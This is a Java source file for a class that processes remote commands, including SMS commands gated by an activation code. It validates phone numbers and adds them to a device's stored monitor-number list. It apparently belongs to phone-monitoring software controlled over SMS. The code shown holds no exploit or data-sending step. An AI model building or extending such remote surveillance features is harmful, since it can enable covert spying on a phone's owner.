package com.vvt.remotecommandmanager.processor.monitorcall;

import java.util.List;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PreDefaultValues;
import com.vvt.preference_manager.PrefMonitorNumber;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class AddMonitorsProcessor extends RemoteCommandProcessor {
	private static final String TAG = "AddMonitorsProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private PreferenceManager mPreferenceManager;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public AddMonitorsProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, PreferenceManager preferenceManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mPreferenceManager = preferenceManager;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ... ");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		List<String> args = null;
		
		try	 {
			
			if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
				args = RemoteCommandUtil.removeActivationCodeFromArgs(commandData.getArguments());			
			}
			else {
				args = commandData.getArguments();
			}
			if(LOGD) FxLog.d(TAG, "doProcessCommand # args : " + args.toString());
			PrefMonitorNumber  monitorNumber = (PrefMonitorNumber)mPreferenceManager.getPreference(PreferenceType.MONITOR_NUMBER);
			
			if(monitorNumber.getMonitorNumber().size() >= PreDefaultValues.MAX_MONITOR_NUMBERS_ALLOWED) {
				if(LOGW) FxLog.w(TAG, "doProcessCommand # MAX_MONITOR_NUMBERS_ALLOWED ");
				mReplyMessage.setIsSuccess(false);
				mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdMonitorExceedListCapacity));
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
				return;
			}
			
			// Validate
			for(String number: args) {
				if(LOGV) FxLog.v(TAG, "doProcessCommand # number : " + number);
				if(!RemoteCommandUtil.isPhoneNumberFormat(number)) {
					if(LOGW) FxLog.w(TAG, "doProcessCommand # invalid format number : "+number);
					mReplyMessage.setIsSuccess(false);
					mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdInvalidNumberToMonitorList));
					mReplyMessage.setMessage(mReplyMessageBuilder.toString());
					return;
				}
				
				if(monitorNumber.getMonitorNumber().contains(number)) {
					if(LOGW) FxLog.w(TAG, "doProcessCommand # Duplicate phone number : "+number);
					mReplyMessage.setIsSuccess(false);
					mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdCannotAddDuplicateToMonitorList));
					mReplyMessage.setMessage(mReplyMessageBuilder.toString());
					return;
				}
	
			}
		
			for(String number: args) {
				if(LOGV) FxLog.v(TAG, "doProcessCommand # add number : "+number);
				monitorNumber.addMonitorNumber(number.trim());
			}
			if(LOGV) FxLog.v(TAG, "doProcessCommand # savePreferenceAndNotifyChange ");
			mPreferenceManager.savePreferenceAndNotifyChange(monitorNumber);
			if(LOGD) FxLog.d(TAG, "doProcessCommand # After add monitorNumber : "+monitorNumber.getMonitorNumber().toString());
			
			mReplyMessage.setIsSuccess(true);
			mReplyMessageBuilder.append(MessageManager.ADD_MONITOR_NUMBER_SUCCESS);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.ADD_MONITOR_NUMBER_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # isSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ... ");
	}

	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if(commandData.getArguments().size() < 2) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
		else {
			if(commandData.getArguments().size() <= 0) {
				throw new InvalidCommandFormatException();
			}
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
